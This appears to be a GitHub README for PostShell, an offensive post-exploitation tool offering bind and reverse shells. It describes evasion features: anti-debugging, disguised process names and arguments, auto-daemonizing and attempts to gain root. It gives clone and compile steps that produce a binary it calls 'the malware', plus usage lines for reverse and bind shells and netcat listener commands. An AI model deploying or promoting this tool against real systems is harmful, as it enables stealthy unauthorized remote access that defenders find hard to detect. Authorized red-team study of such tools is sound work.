# PostShell
PostShell is a post-exploitation shell that includes both a bind and a back connect shell. It creates a fully interactive TTY which allows for job control. The stub size is around 14kb and can be compiled on any Unix like system.

# ScreenShots
![Screenshot](https://github.com/rek7/postshell/blob/master/img01.png)
Banner and interaction with shell after a connection is started.

## Why not use a traditional Backconnect/Bind Shell?
PostShell allows for easier post-exploitation by making the attacker less dependant on dependencies such as Python and Perl. It also incorporates both a back connect and bind shell, meaning that if a target doesn't allow outgoing connections an operator can simply start a bind shell and connect to the machine remotely. PostShell is also significantly less suspicious than a traditional shell due to the fact both the name of the processes and arguments are cloaked.

## Features
+ Anti-Debugging, if ptrace is detected as being attached to the shell it will exit.
+ Process Name/Thread names are cloaked, a fake name overwrites all of the system arguments and file name to make it seem like a legitimate program.
+ TTY, a TTY is created which essentially allows for the same usage of the machine as if you were connected via SSH.
+ Bind/Backconnect shell, both a bind shell and back connect can be created.
+ Small Stub Size, a very small stub(<14kb) is usually generated.
+ Automatically Daemonizes
+ Tries to set GUID/UID to 0 (root)

## Getting Started
1. Downloading: `git clone https://github.com/rek7/postshell`
2. Compiling: `cd postshell && sh compile.sh`
This should create a binary called "stub" this is the malware.

## Commands
```bash
$ ./stub
Bind Shell Usage: ./stub port
Back Connect Usage: ./stub ip port
$
```
## Example Usage
Backconnect:
```bash
$ ./stub 127.0.0.1 13377
```
Bind Shell:
```bash
$ ./stub 13377
```
## Recieving a Connection with Netcat
Recieving a backconnect:
```bash
$ nc -vlp port
```
Connecting to a bind Shell:
```bash
$ nc host port
```

## TODO:
+ Add domain resolution
